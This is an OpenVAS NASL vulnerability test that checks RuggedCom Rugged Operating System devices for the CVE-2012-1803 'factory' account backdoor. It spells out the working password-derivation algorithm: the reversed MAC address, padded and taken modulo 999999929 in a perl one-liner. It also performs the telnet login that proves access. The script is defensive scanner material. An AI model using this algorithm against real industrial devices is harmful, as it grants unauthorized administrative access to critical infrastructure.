###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_rugged_operating_system_53215.nasl 12 2013-10-27 11:15:33Z jan $
#
# Rugged Operating System Backdoor Unauthorized Access Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Rugged Operating System is prone to an unauthorized-access
vulnerability due to a backdoor in all versions of the application.

Attackers can exploit this issue to gain unauthorized access to the
affected application. This may aid in further attacks.";

tag_solution = "Updates are available. Please see the references for more information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103499";
CPE = "cpe:/o:ruggedcom:ros";

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

if (description)
{
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53215");
 script_xref(name : "URL" , value : "http://www.ruggedcom.com/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/522467");
 script_xref(name : "URL" , value : "http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-12-116-01.pdf");
 script_xref(name : "URL" , value : "http://www.us-cert.gov/control_systems/pdf/ICSA-12-146-01.pdf");
 script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/889195");
 script_oid(SCRIPT_OID);
 script_bugtraq_id(53215);
 script_cve_id("CVE-2012-1803");
 script_tag(name:"cvss_base", value:"8.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
 script_version ("$Revision: 12 $");

 script_name("Rugged Operating System Backdoor Unauthorized Access Vulnerability");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-06-21 13:07:51 +0200 (Thu, 21 Jun 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to login as user factory");
 script_category(ACT_ATTACK);
 script_family("Default Accounts");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("gb_ros_detect.nasl");
 script_require_ports("Service/telnet", 23);
 script_require_keys("rugged_os/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("telnet_func.inc");
include("host_details.inc");

if(!find_in_path("perl"))exit(0);

port = 23;

vers = get_app_version(cpe:CPE, nvt:SCRIPT_OID); # just for host details

if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(!soc) exit(0);

r = telnet_negotiate(socket:soc);

if("Rugged Operating System" >!< r && "MAC Address" >!< r)exit(0);

mac_string = eregmatch(pattern:"MAC Address:[ ]+([0-9A-F-]+)", string:r);

if(!mac_string[1])exit(0);

mac = mac_string[1]; 

mac = split(mac, sep:"-", keep:FALSE);

if(max_index(mac) != 6) exit(0);

for(x=5; x >= 0; x--) {

  mac_reverse += mac[x];

}  

mac_reverse += '0000';

# it seems that the resulting int is too big for nasl and computing the pass fail. perl also warn about an "Integer overflow in hexadecimal" (on 32bit) but compute right.
# so use perl...

argv[i++] = "perl";
argv[i++] = "-X";
argv[i++] = "-e";
argv[i++] = 'print (hex("' + mac_reverse  + '") % 999999929);';
argv[i++] = '2>/dev/null';

pass = pread(cmd:"perl", argv:argv, cd:0);

if(pass !~ "[0-9]+")exit(0);

user = "factory";

send(socket:soc, data:user + '\n');
recv = recv(socket:soc, length:512);

if("Enter Password" >!< recv)exit(0);

send(socket:soc, data:pass + '\n');
recv = recv(socket:soc, length:512);

close(soc);

if("Main Menu" >< recv && "Administration" >< recv) {

  desc = desc + '\n\nIt was possible to login into the Rugged Operating System using\nusername "factory" and password "' + pass + '".\n';

  security_hole(port:port, data:desc);
  exit(0);
}  

exit(0);

